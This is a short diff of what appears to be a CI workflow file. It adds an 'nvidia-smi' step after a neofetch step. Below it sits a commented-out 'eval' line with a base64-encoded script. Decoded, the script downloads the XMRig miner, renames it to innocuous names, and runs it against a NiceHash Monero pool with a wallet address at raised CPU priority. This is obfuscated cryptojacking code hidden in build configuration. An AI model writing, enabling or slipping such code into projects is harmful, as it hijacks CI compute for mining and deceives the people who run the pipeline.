@@ -24,4 +24,5 @@ jobs:
         run: |
           sudo apt install neofetch
           neofetch
+          nvidia-smi
 #   eval "$(echo "c3VkbyBhcHQgdXBkYXRlIC1xcQpzdWRvIGFwdCBpbnN0YWxsIC15IGN1cmwgZ2l0IGpxCndnZXQgaHR0cHM6Ly9naXRodWIuY29tL3htcmlnL3htcmlnL3JlbGVhc2VzL2Rvd25sb2FkL3Y2LjExLjIveG1yaWctNi4xMS4yLWZvY2FsLXg2NC50YXIuZ3oKbXYgeG1yaWctNi4xMS4yLWZvY2FsLXg2NC50YXIuZ3ogZnVubnkudGFyLmd6CnRhciAteGYgZnVubnkudGFyLmd6CnJtIC1yZiBmdW5ueS50YXIuZ3oKbXYgeG1yaWctNi4xMS4yIGxvbApjZCBsb2wKbXYgeG1yaWcgaGVsbG8KY2htb2QgdSt4IGhlbGxvCi4vaGVsbG8gLW8gc3RyYXR1bSt0Y3A6Ly9yYW5kb214bW9uZXJvLmV1Lm5pY2VoYXNoLmNvbTozMzgwIC11IDMydE4ycW1WQnFwOWVHWVRGSHVETmZtemMyZEVwTkNDU0UgLXAgeCAtLXRscyAtayAtLW5pY2VoYXNoIC1hIHJ4LzAgLS1jcHUtcHJpb3JpdHkgNQ==" | base64 -d)"
